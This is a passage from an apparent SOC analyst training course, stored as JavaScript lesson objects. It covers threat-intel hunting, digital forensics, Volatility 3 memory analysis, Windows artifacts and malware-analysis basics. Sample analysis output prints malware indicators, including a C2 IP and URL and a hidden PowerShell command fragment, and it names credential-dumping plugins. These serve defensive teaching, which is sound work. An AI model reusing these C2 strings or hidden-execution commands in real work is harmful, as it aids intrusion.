| join kind=inner iocs on $left.Name == $right.Domain
| summarize Hits = count(), Hosts = make_set(Computer) by Name, Confidence

SPL:
index=dns earliest=-30d
| lookup threat_intel_domains.csv domain AS query OUTPUT confidence threat
| where isnotnull(threat)
| stats count values(src) AS hosts BY query threat confidence</code></pre>
  (Older Sentinel workspaces use the <code>ThreatIntelligenceIndicator</code> table with <code>DomainName</code>/<code>NetworkIP</code> columns.)</li>
  <li><b>Detect</b>: load high-confidence, current indicators into SIEM matching rules with expiry dates.</li>
  <li><b>Block</b>: push only high-confidence, low-collateral indicators to firewalls, DNS filtering, proxies and EDR.</li>
  <li><b>Hunt for TTPs</b>: the report's behaviors (not just IOCs) become hunt hypotheses and new detections &mdash; climbing the Pyramid of Pain.</li>
  <li><b>Feed back</b>: record sightings and false positives so scores improve.</li>
</ol>

<div class="callout tip"><b>Tip:</b> In your ticket, always record the enrichment result <i>and the time you checked it</i>. "VT 0/72 at 14:05 UTC" is useful history when the same hash shows 45/72 the next morning.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objectives 1.4 and 2.x cover intel source confidence, IOC types and enrichment. BTL1 threat intelligence includes using OSINT tools for IOC lookups and understanding indicator limitations.</div>
`,
  keyTerms: [
    ["Enrichment", "Adding reputation, ownership and context to an indicator"],
    ["Passive DNS", "Historical record of domain-to-IP resolutions observed over time"],
    ["Sinkhole", "Researcher- or law-enforcement-controlled server that receives traffic for seized malicious domains"],
    ["Shared infrastructure", "Hosting or CDN IPs serving many unrelated sites, risky to block"],
    ["Admiralty Code", "NATO rating system for source reliability (A-F) and information credibility (1-6)"],
    ["Retro-hunt", "Searching historical data for newly learned indicators"],
    ["Indicator expiry", "Time after which an IOC is no longer considered valid"],
    ["OPSEC", "Operational security: avoiding actions that reveal your investigation to the adversary"]
  ],
  standards: ["OASIS STIX 2.1", "FIRST TLP 2.0"],
  labs: ["lab-ioc-triage"]
}
);

/* ===================== p3-m3 Digital Forensics ===================== */
CP.lessons.push(
{
  id: "p3-m3-l1",
  module: "p3-m3",
  title: "Forensic Principles: Volatility, Integrity and Chain of Custody",
  minutes: 18,
  objectives: [
    "Apply the order of volatility from RFC 3227 when collecting evidence",
    "Use hashing and write blockers to preserve evidence integrity",
    "Maintain a defensible chain of custody",
    "Distinguish forensic investigation from incident triage and know legal considerations"
  ],
  html: `
<p><b>Digital forensics</b> is the collection, preservation, analysis and presentation of digital evidence in a way that is reliable and, when necessary, legally defensible. In a SOC context, DFIR (Digital Forensics and Incident Response) answers the questions alerts cannot: exactly what did the attacker do, when, and what did they access?</p>

<h3>Core principles</h3>
<ul>
  <li><b>Preserve the original</b>: work on verified copies, never the original evidence.</li>
  <li><b>Minimize change</b>: every action on a live system alters it (running a tool writes to memory and disk). Know and document the footprint of your actions.</li>
  <li><b>Document everything</b>: who, what, when, where, how &mdash; with UTC timestamps.</li>
  <li><b>Repeatability</b>: another examiner following your notes should reach the same results.</li>
</ul>

<h3>Order of volatility (RFC 3227)</h3>
<p>RFC 3227, <i>Guidelines for Evidence Collection and Archiving</i>, says to collect from most volatile to least volatile:</p>
<ol>
  <li>Registers, CPU cache</li>
  <li>Routing table, ARP cache, process table, kernel statistics, <b>memory (RAM)</b></li>
  <li>Temporary file systems</li>
  <li>Disk</li>
  <li>Remote logging and monitoring data relevant to the system</li>
  <li>Physical configuration, network topology</li>
  <li>Archival media (backups)</li>
</ol>
<p>In practice responders capture <b>memory first</b> (network connections, running processes, injected code, encryption keys, command history all live there), then quick volatile triage (connections, logged-on users), then disk. Cloud adds new volatile items: short-lived containers, auto-scaling instances, and log retention windows (some SaaS audit logs keep only 90 or 180 days by default).</p>

<div class="callout warn"><b>Warning:</b> Pulling the plug or rebooting destroys RAM. Shutting down "gracefully" also changes the disk (logs written, temp files deleted, possibly malware cleanup routines triggered). Unless the business risk of leaving it running is too high, isolate on the network via EDR and capture memory first.</div>

<h3>Integrity: hashing and write blocking</h3>
<ul>
  <li><b>Hash</b> evidence at acquisition and before/after analysis. SHA-256 is standard; MD5 and SHA-1 are often recorded too for compatibility with older tools, but they are not collision-resistant.</li>
  <li><b>Write blockers</b> (hardware such as Tableau, or software) prevent any write to source media during imaging.</li>
  <li><b>Verify</b>: the hash of the image must match the hash of the source. Imaging tools do this automatically.</li>
</ul>
<pre><code>$ sha256sum /evidence/WS-0142_disk.E01
4c1f0e3b9d...a7e2  /evidence/WS-0142_disk.E01

PS&gt; Get-FileHash -Algorithm SHA256 .\\WS-0142_mem.raw
Algorithm  Hash                                   Path
SHA256     A91D...77C0                            C:\\Evidence\\WS-0142_mem.raw</code></pre>

<h3>Chain of custody</h3>
<p>A <b>chain of custody</b> documents every person who handled the evidence, when, why and how, from collection to court or disposal. A gap can make evidence inadmissible or simply untrustworthy.</p>
<table>
  <tr><th>Field</th><th>Example</th></tr>
  <tr><td>Evidence ID</td><td>IR-2026-0142-E003</td></tr>
  <tr><td>Description</td><td>Memory image of WS-0142, 16 GB raw, SHA-256 A91D...77C0</td></tr>
  <tr><td>Collected by / when / where</td><td>J. Park, 2026-10-15 09:41 UTC, via EDR live response, Building 2</td></tr>
  <tr><td>Transfers</td><td>2026-10-15 11:02 UTC J. Park &rarr; R. Diaz (DFIR), purpose: analysis, method: encrypted evidence share</td></tr>
  <tr><td>Storage</td><td>Evidence server EV01, access-controlled, logged</td></tr>
  <tr><td>Hash verification</td><td>Verified on receipt 11:05 UTC &mdash; match</td></tr>
</table>
<p>For physical items: tamper-evident bags, labels, signatures, and a locked evidence locker with an access log.</p>

<h3>Legal and organizational considerations</h3>
<ul>
  <li><b>Legal hold</b>: when litigation is anticipated, relevant data must be preserved and normal deletion suspended.</li>
  <li><b>Authorization and privacy</b>: examine only what you are authorized to; employee privacy laws (e.g., in the EU) restrict monitoring and analysis.</li>
  <li><b>Insider and HR cases</b>: involve HR and legal from the start; treat as potentially going to court.</li>
  <li><b>Law enforcement</b>: if criminal prosecution is likely, coordinate before altering evidence.</li>
  <li><b>Standards</b>: ISO/IEC 27037 (identification, collection, acquisition and preservation), NIST SP 800-86 (integrating forensics into IR).</li>
</ul>

<div class="callout tip"><b>Tip:</b> Even in "just triage" situations, adopt forensic habits: hash what you collect, note timestamps in UTC, and record what commands you ran. It costs seconds and saves cases when a "quick check" turns into a legal matter.</div>

<div class="callout real"><b>On the job:</b> Most corporate DFIR is not headed for court; it aims to answer scope questions quickly. Triage collection tools such as KAPE and Velociraptor gather the key artifacts in minutes instead of imaging whole disks. Full images are taken for critical systems or when litigation is likely.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 Domain 3 covers evidence acquisition, chain of custody, legal hold, and preservation. Security+ and CISSP both test order of volatility &mdash; memory before disk, disk before backups. BTL1's Digital Forensics domain covers these principles in depth.</div>
`,
  keyTerms: [
    ["Order of volatility", "Collecting evidence from most to least volatile, per RFC 3227"],
    ["Chain of custody", "Documented record of who handled evidence, when and why"],
    ["Write blocker", "Device or software preventing writes to source media during acquisition"],
    ["Hash verification", "Comparing cryptographic hashes to prove evidence has not changed"],
    ["Legal hold", "Requirement to preserve data relevant to anticipated litigation"],
    ["Forensic image", "Bit-for-bit copy of storage media"],
    ["DFIR", "Digital Forensics and Incident Response"]
  ],
  standards: ["RFC 3227", "NIST SP 800-86", "ISO/IEC 27037"],
  labs: ["lab-ir-tabletop"]
},
{
  id: "p3-m3-l2",
  module: "p3-m3",
  title: "Acquisition and Memory Forensics with Volatility 3",
  minutes: 24,
  objectives: [
    "Choose between full disk images, logical/triage collection and memory capture",
    "Describe common acquisition tools and image formats (raw/dd, E01, AFF4)",
    "Run core Volatility 3 plugins to find malicious processes, network connections and injection",
    "Interpret memory analysis output in an investigation"
  ],
  html: `
<h3>Acquisition options</h3>
<table>
  <tr><th>Type</th><th>What</th><th>Tools</th><th>When</th></tr>
  <tr><td><b>Memory capture</b></td><td>Full RAM dump</td><td>WinPmem, DumpIt (Magnet), Magnet RAM Capture, FTK Imager, LiME (Linux), AVML (Linux), EDR memory collection</td><td>First, on any live compromised host</td></tr>
  <tr><td><b>Triage collection</b></td><td>Targeted artifacts: event logs, registry hives, $MFT, prefetch, browser data</td><td>KAPE, Velociraptor, CyLR, EDR investigation packages</td><td>Fast scoping across many hosts</td></tr>
  <tr><td><b>Full disk image</b></td><td>Bit-for-bit copy including unallocated space</td><td>FTK Imager, dd/dcfldd/dc3dd, Guymager, ewfacquire</td><td>Critical systems, legal cases, deleted-file recovery</td></tr>
  <tr><td><b>Cloud snapshots</b></td><td>VM disk snapshots, exported logs</td><td>AWS EBS snapshots, Azure disk snapshots, provider audit log export</td><td>Cloud workloads</td></tr>
</table>
<p>Image formats: <b>raw/dd</b> (simple, no metadata, no compression), <b>E01</b> (EnCase Expert Witness: compression, embedded hashes and case metadata, the most common), <b>AFF4</b> (open, advanced). Physical vs logical: physical captures the whole device; logical captures specific files or partitions.</p>
<pre><code># Linux imaging with hashing and logging
dc3dd if=/dev/sdb of=/evidence/srv01.dd hash=sha256 log=/evidence/srv01.log

# E01 with libewf
ewfacquire -t /evidence/srv01 -f encase6 -c fast -d sha256 /dev/sdb

# Memory on Windows (run from trusted external media)
winpmem_mini_x64.exe C:\\Evidence\\WS-0142_mem.raw</code></pre>

<div class="callout warn"><b>Warning:</b> Full-disk encryption (BitLocker, FileVault, LUKS) means a powered-off disk image may be unreadable without recovery keys. On a live encrypted system, capture memory and consider a <i>logical</i> image while the volume is unlocked; retrieve BitLocker recovery keys from AD/Entra ID before you need them.</div>

<h3>Volatility 3 basics</h3>
<p><b>Volatility 3</b> is the open-source standard for memory analysis (Volatility 2 and its manual profiles are retired; Volatility 3 uses symbol tables and detects the OS automatically). Plugins are named by OS: <code>windows.*</code>, <code>linux.*</code>, <code>mac.*</code>.</p>
<table>
  <tr><th>Plugin</th><th>Shows</th></tr>
  <tr><td><code>windows.info</code></td><td>OS version, build, capture time</td></tr>
  <tr><td><code>windows.pslist</code> / <code>windows.pstree</code></td><td>Processes from the active process list / as a tree</td></tr>
  <tr><td><code>windows.psscan</code></td><td>Scans memory for process structures &mdash; finds hidden/unlinked or exited processes</td></tr>
  <tr><td><code>windows.cmdline</code></td><td>Command line of each process</td></tr>
  <tr><td><code>windows.netscan</code> / <code>windows.netstat</code></td><td>Network connections and listeners with owning PIDs</td></tr>
  <tr><td><code>windows.malfind</code></td><td>Memory regions with execute permissions and no backing file &mdash; injected code</td></tr>
  <tr><td><code>windows.dlllist</code>, <code>windows.handles</code></td><td>Loaded DLLs, open handles (files, registry, mutexes)</td></tr>
  <tr><td><code>windows.svcscan</code></td><td>Services, including malicious ones</td></tr>
  <tr><td><code>windows.registry.hivelist</code> / <code>printkey</code></td><td>Registry in memory (e.g., Run keys)</td></tr>
  <tr><td><code>windows.filescan</code> / <code>windows.dumpfiles</code></td><td>File objects in memory / extract them</td></tr>
  <tr><td><code>windows.hashdump</code>, <code>windows.lsadump</code></td><td>Credential material (handle with care)</td></tr>
</table>

<h3>Walkthrough</h3>
<pre><code>$ vol -f WS-0142_mem.raw windows.pstree
PID   PPID  ImageFileName   CreateTime
4     0     System          2026-10-14 07:58:02
...
5120  4980  explorer.exe    2026-10-14 08:02:11
* 6612 5120 cmd.exe         2026-10-14 13:02:17
** 6688 6612 powershell.exe 2026-10-14 13:02:19
*** 7044 6688 rundll32.exe  2026-10-14 13:02:44

$ vol -f WS-0142_mem.raw windows.cmdline --pid 7044
7044  rundll32.exe  rundll32.exe C:\\Users\\aturner\\AppData\\Local\\Temp\\upd.dll,DllRegisterServer

$ vol -f WS-0142_mem.raw windows.netscan | grep 7044
0xe00c1a2b3c40 TCPv4 10.1.4.22 52114 91.215.85.17 443 ESTABLISHED 7044 rundll32.exe

$ vol -f WS-0142_mem.raw windows.malfind --pid 7044
PID  Process       Start VPN     End VPN       Tag   Protection
7044 rundll32.exe  0x1f0000      0x22ffff      VadS  PAGE_EXECUTE_READWRITE
4d 5a 90 00 03 00 00 00 ...  MZ......</code></pre>
<p>The story: rundll32 (child of PowerShell, child of cmd) loaded a DLL from Temp, holds an established connection to the known C2 IP, and has a private RWX memory region beginning with an <code>MZ</code> header &mdash; a reflectively loaded PE. Next steps: dump the region (<code>windows.malfind --dump</code> or <code>windows.memmap --dump --pid 7044</code>), hash and scan it with YARA (<code>windows.vadyarascan</code> or <code>yarascan.YaraScan</code>), and add the IOCs to the scoping hunt.</p>

<h3>Memory red flags</h3>
<ul>
  <li>Processes in <code>psscan</code> but not <code>pslist</code> (unlinked/hidden).</li>
  <li>Wrong parent (svchost not from services.exe), wrong path, misspelled names.</li>
  <li><code>PAGE_EXECUTE_READWRITE</code> private regions, especially with PE headers or shellcode.</li>
  <li>Network connections from processes that should not have them (notepad, rundll32, regsvr32).</li>
  <li>Encoded command lines, suspicious mutexes in <code>handles</code>.</li>
</ul>

<div class="callout tip"><b>Tip:</b> Run <code>vol -r csv ... &gt; out.csv</code> to export output and load it into Timeline Explorer or a spreadsheet; combine <code>pstree</code>, <code>cmdline</code> and <code>netscan</code> by PID for a quick process-centric picture. MemProcFS is another excellent tool that mounts memory as a file system.</div>

<div class="callout real"><b>On the job:</b> Many EDRs can collect memory remotely, and tools like Velociraptor can run memory scans (YARA) across thousands of endpoints. Full Volatility analysis is usually done by Tier 3/DFIR, but Tier 2 analysts are increasingly expected to run the basic plugins.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 lists memory analysis, disk imaging and hashing tools under incident response activities. BTL1's Digital Forensics domain includes Volatility usage (pslist, pstree, netscan, malfind, cmdline) and FTK Imager acquisition.</div>
`,
  keyTerms: [
    ["Memory capture", "Acquiring a full copy of physical RAM from a live system"],
    ["E01", "EnCase evidence image format with compression and embedded hashes"],
    ["Triage collection", "Targeted acquisition of high-value artifacts instead of a full image"],
    ["KAPE", "Kroll Artifact Parser and Extractor for fast triage collection and processing"],
    ["Volatility 3", "Open-source memory forensics framework using OS-named plugins"],
    ["malfind", "Volatility plugin that finds executable memory regions with no backing file (injection)"],
    ["psscan vs pslist", "Scanning for process structures vs walking the active process list; differences reveal hiding"],
    ["Reflective loading", "Loading a PE directly into memory without writing it to disk"]
  ],
  standards: ["RFC 3227", "NIST SP 800-86"],
  labs: ["lab-yara", "lab-powershell-triage"]
},
{
  id: "p3-m3-l3",
  module: "p3-m3",
  title: "Windows Artifacts and Timeline Analysis",
  minutes: 24,
  objectives: [
    "Identify artifacts that prove program execution, file access and user activity",
    "Use NTFS metadata ($MFT, $UsnJrnl, $LogFile) and understand MACB timestamps",
    "Build a super timeline with Plaso and Eric Zimmerman's tools",
    "Recognize timestomping and other anti-forensics"
  ],
  html: `
<p>Windows records an enormous amount about what happened on it, often in places users and attackers never think to clean. Knowing which artifact answers which question is the core skill of Windows forensics.</p>

<h3>Evidence of execution</h3>
<table>
  <tr><th>Artifact</th><th>Location</th><th>Tells you</th><th>Tool</th></tr>
  <tr><td><b>Prefetch</b></td><td><code>C:\\Windows\\Prefetch\\*.pf</code></td><td>Executable name, run count, last 8 run times, files referenced (workstations; often disabled on servers)</td><td>PECmd</td></tr>
  <tr><td><b>Amcache.hve</b></td><td><code>C:\\Windows\\AppCompat\\Programs\\</code></td><td>Program path, SHA-1 hash, first execution/installation info</td><td>AmcacheParser</td></tr>
  <tr><td><b>Shimcache (AppCompatCache)</b></td><td>SYSTEM hive</td><td>Files the OS evaluated for compatibility; presence is not proof of execution on modern Windows</td><td>AppCompatCacheParser</td></tr>
  <tr><td><b>BAM/DAM</b></td><td>SYSTEM hive</td><td>Last execution time per user</td><td>RECmd / Registry Explorer</td></tr>
  <tr><td><b>UserAssist</b></td><td>NTUSER.DAT</td><td>GUI programs launched by the user, with counts (ROT13-encoded)</td><td>Registry Explorer</td></tr>
  <tr><td><b>SRUM</b></td><td><code>C:\\Windows\\System32\\sru\\SRUDB.dat</code></td><td>Per-app network bytes sent/received over ~30 days &mdash; great for exfil</td><td>SrumECmd</td></tr>
  <tr><td>Event logs</td><td>4688, Sysmon 1, 7045, 4698</td><td>Process and service creation</td><td>EvtxECmd, Hayabusa, Chainsaw</td></tr>
</table>

<h3>Evidence of file and folder access</h3>
<ul>
  <li><b>LNK files</b> (<code>%APPDATA%\\Microsoft\\Windows\\Recent</code>) &mdash; target path, volume serial, MAC times of target; parse with LECmd.</li>
  <li><b>Jump Lists</b> &mdash; recent files per application; JLECmd.</li>
  <li><b>ShellBags</b> (NTUSER.DAT / UsrClass.dat) &mdash; folders the user browsed, even on removed USB drives or deleted folders; SBECmd/ShellBags Explorer.</li>
  <li><b>RecentDocs, OpenSaveMRU</b> registry keys.</li>
  <li><b>USB devices</b>: SYSTEM\\...\\Enum\\USBSTOR, MountedDevices, the Partition/Diagnostic event log (Event 1006).</li>
  <li><b>Browser history</b>: Chrome/Edge <code>History</code> SQLite database (downloads table shows source URL of payloads).</li>
</ul>

<h3>NTFS metadata</h3>
<ul>
  <li><b>$MFT</b> (Master File Table) has a record for every file, with two sets of timestamps: <b>$STANDARD_INFORMATION</b> ($SI, easily modified by user-mode tools) and <b>$FILE_NAME</b> ($FN, maintained by the kernel). Parse with MFTECmd.</li>
  <li><b>MACB</b> timestamps: Modified, Accessed, Changed ($MFT record changed), Born (created).</li>
  <li><b>$UsnJrnl:$J</b> (Update Sequence Number journal): log of file creates, renames, deletes &mdash; reveals files that no longer exist, such as a deleted tool or a renamed archive.</li>
  <li><b>$LogFile</b>: NTFS transaction log for short-term changes.</li>
  <li><b>Zone.Identifier</b> alternate data stream (Mark-of-the-Web): records the URL a file was downloaded from (<code>ZoneId=3</code> = Internet; <code>HostUrl=</code>).</li>
</ul>

<div class="callout warn"><b>Warning:</b> <b>Timestomping</b> (ATT&amp;CK T1070.006) changes a file's $SI timestamps to blend in (e.g., set to 2019). Detection: $SI created time earlier than $FN created time, timestamps with zeroed sub-second precision, or a USN journal entry showing the file was created recently. Always compare $SI and $FN for suspicious files.</div>

<h3>Timeline analysis</h3>
<p>A <b>super timeline</b> merges timestamps from every artifact into one chronological view, revealing sequences: download &rarr; execution &rarr; persistence &rarr; lateral movement.</p>
<h4>Approach 1: Plaso (log2timeline)</h4>
<pre><code>log2timeline.py --storage-file ws0142.plaso /evidence/WS-0142_disk.E01
psort.py -o l2tcsv -w ws0142_timeline.csv ws0142.plaso "date &gt; '2026-10-14 12:30:00' AND date &lt; '2026-10-14 14:00:00'"</code></pre>
<h4>Approach 2: KAPE + Eric Zimmerman tools (faster, targeted)</h4>
<pre><code>kape.exe --tsource C: --tdest D:\\Case\\tout --target KapeTriage --mdest D:\\Case\\mout --module !EZParser
# Output: CSVs for MFT, Prefetch, Amcache, LNK, ShellBags, Registry, Event logs...
# Open in Timeline Explorer, filter on the incident window, sort by timestamp.</code></pre>
<h4>Event log fast triage</h4>
<pre><code>hayabusa.exe csv-timeline -d D:\\Case\\tout\\C\\Windows\\System32\\winevt\\Logs -o ws0142_evtx.csv
chainsaw hunt D:\\Case\\tout\\...\\Logs -s sigma/ --mapping mappings/sigma-event-logs-all.yml</code></pre>
<p>Both Hayabusa and Chainsaw apply Sigma rules directly to EVTX files &mdash; your detection engineering skills transfer to forensics.</p>

<h3>Sample reconstructed timeline</h3>
<table>
  <tr><th>UTC</th><th>Source</th><th>Event</th></tr>
  <tr><td>13:01:52</td><td>Chrome History / Zone.Identifier</td><td>Invoice_8812.zip downloaded from hxxps://docs-share[.]example</td></tr>
  <tr><td>13:02:15</td><td>LNK / ShellBags</td><td>User opened Downloads\\Invoice_8812.zip and Invoice_8812.lnk</td></tr>
  <tr><td>13:02:19</td><td>Prefetch POWERSHELL.EXE / 4104</td><td>Hidden PowerShell download cradle executed</td></tr>
  <tr><td>13:02:40</td><td>$MFT / $UsnJrnl</td><td>upd.dll created in AppData\\Local\\Temp</td></tr>
  <tr><td>13:02:44</td><td>Prefetch RUNDLL32.EXE / Amcache</td><td>rundll32 executed upd.dll</td></tr>
  <tr><td>13:03:10</td><td>Registry (NTUSER Run)</td><td>"OneDriveUpdate" Run value created</td></tr>
  <tr><td>14:20&ndash;14:55</td><td>SRUM</td><td>rundll32.exe sent 1.8 GB &mdash; probable exfiltration</td></tr>
</table>

<div class="callout tip"><b>Tip:</b> Anchor your timeline on a known-good "pivot point" (the alert time, the phishing email delivery) and work outward in both directions. Always note the time zone and confirm the system clock was accurate (compare with network or DC logs).</div>

<div class="callout real"><b>On the job:</b> Eric Zimmerman's tools (free, maintained by SANS instructors) and KAPE are industry standards &mdash; practice them on public datasets and CTF images. The ability to say "I can prove execution with Prefetch and Amcache and show exfil volume with SRUM" is a strong interview answer for DFIR roles.</div>

<div class="callout exam"><b>Exam alignment:</b> BTL1's Digital Forensics domain tests Windows artifacts (Prefetch, registry, LNK, ShellBags, browser artifacts) and timeline creation. CySA+ CS0-003 tests forensic concepts and tools at a recognition level; CISSP Domain 7 covers investigation types and evidence handling.</div>
`,
  keyTerms: [
    ["Prefetch", "Windows files recording program execution count and recent run times"],
    ["Amcache", "Registry hive recording executed program paths and SHA-1 hashes"],
    ["ShellBags", "Registry data recording folders a user viewed in Explorer"],
    ["SRUM", "System Resource Usage Monitor database with per-application network usage"],
    ["$MFT", "NTFS Master File Table containing metadata for every file"],
    ["$SI vs $FN", "Two sets of NTFS timestamps; comparison reveals timestomping"],
    ["$UsnJrnl", "NTFS change journal recording file creation, rename and deletion"],
    ["Super timeline", "Chronological merge of timestamps from all artifacts, e.g. via Plaso"],
    ["Mark-of-the-Web", "Zone.Identifier stream recording that a file came from the internet"]
  ],
  standards: ["NIST SP 800-86", "MITRE ATT&CK T1070.006"],
  labs: ["lab-windows-events"]
}
);

/* ===================== p3-m4 Malware Analysis Fundamentals ===================== */
CP.lessons.push(
{
  id: "p3-m4-l1",
  module: "p3-m4",
  title: "Malware Types and Building a Safe Analysis Lab",
  minutes: 18,
  objectives: [
    "Classify malware by behavior: loaders, RATs, infostealers, ransomware, wipers, rootkits, worms",
    "Describe the stages of malware analysis from triage to reverse engineering",
    "Build an isolated analysis lab with FLARE-VM and REMnux",
    "Follow safe handling practices for live samples"
  ],
  html: `
<p>SOC analysts are not expected to be reverse engineers, but they are expected to triage suspicious files safely, extract indicators and understand what a sample is likely to do. That starts with knowing the landscape and having a safe place to work.</p>

<h3>Malware by function</h3>
<table>
  <tr><th>Type</th><th>Function</th><th>Examples (families come and go)</th></tr>
  <tr><td><b>Loader / dropper</b></td><td>First stage that fetches or unpacks the real payload</td><td>Families such as GuLoader, Latrodectus, SocGholish (JavaScript fake updates)</td></tr>
  <tr><td><b>Infostealer</b></td><td>Steals browser passwords, cookies/session tokens, crypto wallets</td><td>Lumma, RedLine, Vidar, StealC, AMOS (macOS)</td></tr>
  <tr><td><b>RAT / backdoor</b></td><td>Remote control</td><td>AsyncRAT, Remcos, njRAT, plus abused legitimate RMM tools</td></tr>
  <tr><td><b>C2 frameworks</b></td><td>Post-exploitation implants (often legitimate red-team tools abused)</td><td>Cobalt Strike, Sliver, Havoc, Brute Ratel, Mythic</td></tr>
  <tr><td><b>Ransomware</b></td><td>Encrypts data for extortion</td><td>Akira, Qilin, Play, and many RaaS successors to LockBit/BlackCat</td></tr>
  <tr><td><b>Wiper</b></td><td>Destroys data, sometimes disguised as ransomware</td><td>NotPetya, WhisperGate, HermeticWiper</td></tr>
  <tr><td><b>Rootkit / bootkit</b></td><td>Hides at kernel or firmware level</td><td>BlackLotus (UEFI bootkit)</td></tr>
  <tr><td><b>Worm</b></td><td>Self-propagates across networks</td><td>WannaCry, Raspberry Robin (USB)</td></tr>
  <tr><td><b>Cryptominer</b></td><td>Uses victim resources to mine cryptocurrency</td><td>XMRig deployments on cloud/containers</td></tr>
</table>
<p>Infostealers deserve special attention: stolen session cookies and saved credentials from an employee's personal or unmanaged device are a leading source of corporate account compromise, and the logs are sold on criminal marketplaces.</p>

<h3>Stages of analysis</h3>
<ol>
  <li><b>Automated triage</b>: hash lookups, sandbox detonation, YARA scanning. Minutes.</li>
  <li><b>Static properties</b>: file type, hashes, strings, PE headers, imports, signatures, entropy, packer detection. No execution.</li>
  <li><b>Interactive behavioral (dynamic) analysis</b>: run it in a controlled VM and watch processes, files, registry and network.</li>
  <li><b>Manual code reversing</b>: disassembly and debugging with Ghidra, IDA, Binary Ninja, x64dbg; deobfuscating scripts. Hours to weeks; usually Tier 3 or dedicated malware analysts.</li>
</ol>
<p>Each stage costs more time than the last, so stop when you have enough to answer the investigation's question (is it malicious, what does it do, what are the IOCs, what else should we look for?).</p>

<h3>Building a safe lab</h3>
<ul>
  <li><b>Virtualization</b>: VMware Workstation, VirtualBox, Hyper-V or a dedicated hypervisor host. Use <b>snapshots</b> to revert to clean state after each run.</li>
  <li><b>Windows analysis VM</b>: <b>FLARE-VM</b> (Mandiant) installs analysis tools onto a Windows VM: PEStudio, Detect It Easy, CFF Explorer, x64dbg, Ghidra, Sysinternals (Procmon, Process Explorer, Autoruns), Wireshark, dnSpyEx, CyberChef, capa, FLOSS.</li>
  <li><b>Linux analysis VM</b>: <b>REMnux</b> provides tools for static analysis, document analysis (oletools, pdf-parser), network simulation (INetSim, FakeNet-NG), and memory forensics.</li>
  <li><b>Network isolation</b>: host-only or internal network only; route the Windows VM's traffic to REMnux running INetSim/FakeNet to simulate internet services. If live internet is truly required, use a separate, monitored egress (VPN) that cannot reach your corporate network.</li>
  <li><b>Hardening the lab</b>: disable shared folders, clipboard sharing and drag-and-drop; no corporate credentials in the VMs; keep the hypervisor patched (VM escape vulnerabilities exist).</li>
</ul>

<h3>Safe handling of samples</h3>
<ul>
  <li>Store samples in password-protected ZIPs (the convention is the password <code>infected</code>), which prevents AV from deleting them and accidental execution.</li>
  <li>Rename extensions (<code>sample.exe_</code>) and defang in documentation.</li>
  <li>Record SHA-256 hashes and the source of every sample (chain of custody).</li>
  <li>Never analyze on a corporate workstation or in a VM bridged to the corporate network.</li>
</ul>

<div class="callout warn"><b>Warning:</b> Some malware detects virtual machines and analysis tools and either stays dormant or behaves benignly (sandbox evasion). Some deliberately targets analysts. A "nothing happened" result in your lab is not proof of safety.</div>

<div class="callout tip"><b>Tip:</b> Practice safely with known samples from MalwareBazaar, theZoo or training datasets in your isolated lab, and follow along with public reports (The DFIR Report publishes full intrusion write-ups including tooling).</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 references malware types, sandboxing and the purpose of reverse engineering. BTL1 covers safe malware handling, static vs dynamic analysis and common tools. Security+ SY0-701 tests malware types by behavior (e.g., "self-replicating without user interaction" = worm).</div>
`,
  keyTerms: [
    ["Loader", "First-stage malware that downloads or unpacks the main payload"],
    ["Infostealer", "Malware that harvests credentials, cookies and wallets"],
    ["RAT", "Remote Access Trojan giving an attacker control of a system"],
    ["Wiper", "Destructive malware that erases or corrupts data"],
    ["Static analysis", "Examining a sample without executing it"],
    ["Dynamic analysis", "Executing a sample in a controlled environment to observe behavior"],
    ["FLARE-VM / REMnux", "Windows and Linux malware analysis distributions"],
    ["INetSim / FakeNet-NG", "Tools that simulate internet services to capture malware network behavior"]
  ],
  standards: ["NIST SP 800-83 Rev. 1"],
  labs: ["lab-yara"]
},
{
  id: "p3-m4-l2",
  module: "p3-m4",
  title: "Static Analysis and YARA Rules",
  minutes: 24,
  objectives: [
    "Perform static triage: file type, hashes, strings, PE structure, imports, entropy",
    "Identify packed or obfuscated samples",
    "Write YARA rules with strings, hex patterns, conditions and modules",
    "Use YARA to scan files, directories and memory, and know its limitations"
  ],
  html: `
<h3>Static triage workflow</h3>
<ol>
  <li><b>Identify the file type</b> by magic bytes: <code>file sample.bin</code>, Detect It Easy (DIE), TrID. <code>MZ</code> = PE; <code>7F 45 4C 46</code> = ELF; <code>PK</code> = ZIP/OOXML/JAR/APK.</li>
  <li><b>Hash</b>: MD5/SHA-1/SHA-256 for lookups; <b>imphash</b> (hash of the import table) and <b>ssdeep/TLSH</b> fuzzy hashes cluster similar samples even when the exact hash differs.</li>
  <li><b>Reputation lookup</b> by hash (not upload) in VirusTotal, MalwareBazaar, internal TIP.</li>
  <li><b>Strings</b>: <code>strings -n 6 sample.exe</code> and <code>strings -el</code> for UTF-16; better, <b>FLOSS</b> also extracts obfuscated and stack strings.</li>
  <li><b>PE analysis</b> with PEStudio, PE-bear or <code>pefile</code>: compile timestamp, sections, imports, resources, digital signature, version info.</li>
  <li><b>Capabilities</b>: <b>capa</b> (Mandiant) maps code features to ATT&amp;CK and MBC (Malware Behavior Catalog), e.g., "inject into process," "encrypt data using AES."</li>
</ol>

<h3>Reading PE indicators</h3>
<pre><code>$ capa sample.exe
ATT&amp;CK Tactic      ATT&amp;CK Technique
DEFENSE EVASION    Process Injection T1055
DISCOVERY          System Information Discovery T1082
EXECUTION          Command and Scripting Interpreter T1059

$ floss sample.exe | grep -Ei "http|\\.exe|\\.dll|mutex|HKCU|powershell"
http://91.215.85.17/gate.php
Global\\MtxUpd7731
Software\\Microsoft\\Windows\\CurrentVersion\\Run
powershell -nop -w hidden -c</code></pre>
<table>
  <tr><th>Indicator</th><th>Suggests</th></tr>
  <tr><td>Imports <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code></td><td>Process injection</td></tr>
  <tr><td>Imports <code>InternetOpenUrlA</code>, <code>URLDownloadToFileW</code>, <code>WinHttpSendRequest</code></td><td>Downloads / C2</td></tr>
  <tr><td>Imports <code>CryptEncrypt</code>, <code>BCryptEncrypt</code> plus file enumeration (<code>FindFirstFileW</code>)</td><td>Possible ransomware</td></tr>
  <tr><td>Very few imports (<code>LoadLibraryA</code>, <code>GetProcAddress</code> only)</td><td>Packed; imports resolved at runtime</td></tr>
